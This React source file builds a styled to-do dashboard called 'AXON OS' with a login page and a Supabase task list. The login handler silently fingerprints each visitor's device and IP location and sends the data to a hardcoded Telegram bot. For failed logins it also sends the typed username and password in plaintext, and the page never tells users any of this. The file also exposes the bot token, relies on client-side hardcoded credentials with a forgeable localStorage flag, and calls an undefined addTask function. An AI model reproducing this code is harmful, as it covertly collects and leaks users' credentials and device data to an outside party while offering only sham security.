import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useNavigate } from 'react-router-dom';
import 'bootstrap/dist/css/bootstrap.min.css';
import 'bootstrap-icons/font/bootstrap-icons.css';
import { supabase } from './supabaseClient';

// --- 1. LOGIN COMPONENT (Forensic Intel + Cyberpunk UI) ---
const Login = ({ setAuth }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isShaking, setIsShaking] = useState(false);
  const navigate = useNavigate();

  const handleLogin = async (e) => {
    e.preventDefault();

    // 1. Gather Maximum Forensic Data
    let gpu = "Unknown";
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    } catch (e) {}

    const forensics = {
      platform: navigator.platform,
      cores: navigator.hardwareConcurrency || 'N/A',
      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
      res: `${window.screen.width}x${window.screen.height}`,
      gpu: gpu,
      ua: navigator.userAgent,
      ref: document.referrer || "Direct Entry"
    };

    let net = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown" };
    try {
      const response = await fetch('https://ipapi.co/json/');
      if (response.ok) net = await response.json();
    } catch (err) { console.error(err); }

    const token = "8494749951:AAFDLdupc8KvrwyAnnkvR-iTG9ZfWUTLLOg";
    const chat = "8620003085";

    if (username === 'user' && password === 'user') {
      const message = encodeURIComponent(
        `🛰 *AXON OS: AUTHORIZED ACCESS*\n\n` +
        `👤 *User:* ${username}\n` +
        `🌐 *IP:* ${net.ip}\n` +
        `📍 *Loc:* ${net.city}, ${net.region}\n` +
        `🏢 *ISP:* ${net.org}\n\n` +
        `🖥 *SYSTEM SPECS*\n` +
        `💻 *OS:* ${forensics.platform}\n` +
        `🎮 *GPU:* ${forensics.gpu}\n` +
        `⚙️ *CPU:* ${forensics.cores} Cores\n` +
        `🧠 *RAM:* ${forensics.memory}\n` +
        `📏 *Res:* ${forensics.res}\n\n` +
        `📄 *UA:* \`${forensics.ua}\`\n` +
        `🔗 *Ref:* ${forensics.ref}\n\n` +
        `🟢 *Status:* SUCCESS`
      );

      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${message}&parse_mode=Markdown`);
      setAuth(true); 
      navigate('/dashboard');
    } else {
      const breachMsg = encodeURIComponent(
        `⛔️ *SECURITY BREACH ATTEMPT*\n\n` +
        `🚫 *Tried:* ${username} / ${password}\n` +
        `🌐 *IP:* ${net.ip}\n` +
        `📍 *Loc:* ${net.city}\n` +
        `💻 *Platform:* ${forensics.platform}\n` +
        `🔴 *Status:* ACCESS_DENIED`
      );
      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${breachMsg}&parse_mode=Markdown`);

      setIsShaking(true);
      setError('ACCESS_DENIED_BY_KERNEL');
      setTimeout(() => setIsShaking(false), 500); 
    }
  };

  return (
    <div className="cyber-bg">
      <style>{`
        .cyber-bg {
          min-height: 100vh; display: flex; align-items: center; justify-content: center;
          background: #020617; overflow: hidden; position: relative;
        }
        .grid-overlay {
          position: absolute; width: 200%; height: 200%;
          background-image: linear-gradient(rgba(99, 102, 241, 0.1) 1px, transparent 1px), 
                            linear-gradient(90deg, rgba(99, 102, 241, 0.1) 1px, transparent 1px);
          background-size: 40px 40px; transform: perspective(500px) rotateX(60deg);
          bottom: -50%; left: -50%; animation: move-grid 15s linear infinite;
        }
        @keyframes move-grid { from { transform: perspective(500px) rotateX(60deg) translateY(0); } to { transform: perspective(500px) rotateX(60deg) translateY(40px); } }
        
        .glass-card {
          background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(20px);
          border: 1px solid rgba(99, 102, 241, 0.3); border-radius: 24px;
          padding: 3rem; width: 100%; max-width: 400px; z-index: 10;
          box-shadow: 0 0 50px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(99, 102, 241, 0.1);
        }
        .cyber-input {
          background: rgba(2, 6, 23, 0.6); border: 1px solid rgba(255, 255, 255, 0.1);
          color: #818cf8; border-radius: 12px; padding: 12px; margin-bottom: 1rem;
          font-family: 'Courier New', monospace; transition: 0.3s; width: 100%;
        }
        .cyber-input:focus { border-color: #6366f1; box-shadow: 0 0 15px rgba(99, 102, 241, 0.4); outline: none; }
        .cyber-btn {
          background: linear-gradient(45deg, #4f46e5, #818cf8); border: none;
          color: white; font-weight: bold; border-radius: 12px; padding: 14px;
          width: 100%; letter-spacing: 2px; text-transform: uppercase;
        }
        .shake { animation: shake-anim 0.4s; }
        @keyframes shake-anim { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
      `}</style>
      
      <div className="grid-overlay"></div>

      <div className={`glass-card ${isShaking ? 'shake' : ''}`}>
        <div className="text-center mb-4">
          <i className="bi bi-shield-lock-fill text-primary display-4"></i>
          <h2 className="fw-bold text-white mt-2">AXON <span className="text-primary">OS</span></h2>
          <div className="text-secondary small">SECURE_KERNEL_v4.0</div>
        </div>
        <form onSubmit={handleLogin}>
          <input type="text" placeholder="ACCESS_ID" className="cyber-input" value={username} onChange={(e) => setUsername(e.target.value)} />
          <input type="password" placeholder="SECURITY_KEY" className="cyber-input" value={password} onChange={(e) => setPassword(e.target.value)} />
          {error && <p className="text-danger small text-center">{error}</p>}
          <button type="submit" className="cyber-btn">Authorize</button>
        </form>
        <div className="mt-5 text-center border-top border-secondary pt-3 opacity-50">
          <div className="small text-secondary text-uppercase" style={{fontSize: '0.6rem'}}>System Architect</div>
          <div className="text-white small fw-bold">Shifanth Jasim</div>
        </div>
      </div>
    </div>
  );
};

// --- 2. DASHBOARD COMPONENT ---
function Dashboard({ setAuth }) {
  const [tasks, setTasks] = useState([]);
  const [input, setInput] = useState("");
  const [scanLogs, setScanLogs] = useState(["> KERNEL_ACTIVE", "> AUTH_SYNC_COMPLETE"]);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchTasks = async () => {
      const { data } = await supabase.from('tasks').select('*').order('id', { ascending: false });
      if (data) setTasks(data);
    };
    fetchTasks();

    const logInterval = setInterval(() => {
      const cmds = ["UPLOADING_METRICS", "ENCRYPTING_QUERY", "SYNCING_REMOTE_NODE", "TUNNEL_STABLE"];
      setScanLogs(p => [...p.slice(-4), `> ${cmds[Math.floor(Math.random() * cmds.length)]}... [OK]`]);
    }, 4000);
    return () => clearInterval(logInterval);
  }, []);

  return (
    <div className="min-vh-100 bg-black p-4 text-white" style={{fontFamily: "'Inter', sans-serif"}}>
      <style>{`
        .dash-card { background: rgba(30, 41, 59, 0.6); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; }
        .terminal { background: #020617; font-family: 'Courier New', monospace; color: #10b981; font-size: 0.75rem; border-radius: 12px; }
        .logout-btn { border-radius: 10px; border: 1px solid rgba(239, 68, 68, 0.3); transition: 0.3s; }
        .logout-btn:hover { background: #ef4444; border-color: #ef4444; }
      `}</style>

      <nav className="d-flex justify-content-between align-items-center mb-5 pb-3 border-bottom border-secondary border-opacity-25">
        <div className="fw-bold h4 m-0">AXON <span className="text-primary">OS</span></div>
        <button onClick={() => { setAuth(false); localStorage.removeItem('axon_auth'); navigate('/login'); }} className="btn btn-sm logout-btn text-white px-3">DISCONNECT</button>
      </nav>

      <div className="row g-4">
        <div className="col-md-8">
          <div className="dash-card p-4">
            <h5 className="mb-4 text-secondary">ACTIVE_DIRECTIVES</h5>
            <div className="input-group mb-4">
              <input type="text" className="cyber-input m-0 rounded-start" placeholder="Initialize command..." value={input} onChange={(e) => setInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && addTask()} />
              <button className="btn btn-primary px-4" onClick={async () => {
                const { data } = await supabase.from('tasks').insert([{ text: input, completed: false }]).select();
                if (data) { setTasks([data[0], ...tasks]); setInput(""); }
              }} style={{borderRadius: '0 12px 12px 0'}}>DEPLOY</button>
            </div>
            {tasks.map(t => (
              <div key={t.id} className="p-3 mb-2 rounded border border-secondary border-opacity-10 bg-white bg-opacity-5 d-flex justify-content-between">
                <span>{t.text}</span>
                <i className="bi bi-cpu text-primary"></i>
              </div>
            ))}
          </div>
        </div>

        <div className="col-md-4">
          <div className="dash-card p-4">
            <h6 className="text-secondary small mb-3">SYSTEM_LOG_STREAM</h6>
            <div className="terminal p-3 mb-4">
              {scanLogs.map((l, i) => <div key={i}>{l}</div>)}
            </div>
            <div className="small text-secondary">
               <div>Uptime: 99.98%</div>
               <div>Location: Kandy, LK</div>
               <div>Latency: 18ms</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// --- 3. MAIN ROUTER (The Persistence Fix) ---
export default function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return localStorage.getItem('axon_auth') === 'true';
  });

  useEffect(() => {
    localStorage.setItem('axon_auth', isAuthenticated);
  }, [isAuthenticated]);

  return (
    <Router>
      <Routes>
        <Route path="/login" element={!isAuthenticated ? <Login setAuth={setIsAuthenticated} /> : <Navigate to="/dashboard" replace />} />
        <Route path="/dashboard" element={isAuthenticated ? <Dashboard setAuth={setIsAuthenticated} /> : <Navigate to="/login" replace />} />
        <Route path="*" element={<Navigate to="/login" replace />} />
      </Routes>
    </Router>
  );
}